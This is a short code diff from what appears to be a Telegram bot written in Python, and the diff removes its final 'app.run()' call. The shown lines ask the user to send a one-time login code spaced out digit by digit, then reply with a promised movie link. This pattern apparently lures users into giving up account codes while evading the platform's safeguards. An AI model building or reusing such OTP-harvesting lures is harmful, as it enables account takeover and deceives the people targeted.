@@ -127,5 +127,3 @@ If OTP is 12345, please send it as 1 2 3 4 5. </b>"""
 def otp_received(client, message):
     message.reply_text(f"""<b> Here is Your Link: 
 https://example.com/yourmovie </b>""")
-
-app.run()
